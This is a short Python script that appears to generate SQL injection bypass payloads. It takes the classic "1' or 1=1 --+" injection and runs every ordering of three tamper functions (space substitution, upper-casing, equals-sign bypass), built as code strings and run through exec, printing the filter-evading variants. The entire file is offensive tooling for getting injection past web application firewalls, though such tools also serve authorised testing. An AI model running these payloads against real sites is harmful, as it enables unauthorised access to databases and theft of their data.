from module.Space2Payload import *
from module.UpperCase import *
from module.EqualBypass import *
from itertools import permutations

funcs=[UpperCaseMain,Space2Payload,EqualBypass]

init=["1' or 1=1 --+"]

def convert(f,l=[]):
    return f(l)


for func_set in permutations(funcs,3):
    flag=0
    init_parm0=init
    for i in range(0, len(func_set)):
        while flag < len(func_set):
            init_parm = "func_set["+str(flag)+"]"
            if flag == 0:
                init_parm0 = "convert("+init_parm+","+str(init_parm0)+")"
                flag = flag+1
                #code="print("+init_parm0+")"
            else:
                init_parm0 = "convert("+init_parm+","+init_parm0+")"
                #code="print("+"convert("+init_parm+","+init_parm0+")"+")"
                flag = flag+1
    code = init_parm0
    print(code)
    code = '''p = %s\nfor k in p:\n print(k)'''%(code)
    exec(code)
